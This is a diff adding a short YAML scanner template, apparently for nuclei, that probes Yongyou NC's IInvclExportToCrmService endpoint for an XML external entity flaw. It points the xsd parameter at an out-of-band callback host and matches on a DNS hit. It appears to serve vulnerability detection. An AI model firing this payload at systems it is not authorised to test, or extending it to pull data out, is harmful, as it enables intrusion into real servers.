@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-nc-iinvclexporttocrmservice-xxe
+info:
+  name: Yongyou NC IInvclExportToCrmService XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+http:
+  - method: GET
+    path:
+      - "/uapws/service/nc.itf.bd.crm.IInvclExportToCrmService?xsd=http://{{interactsh-url}}/ext.dtd"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
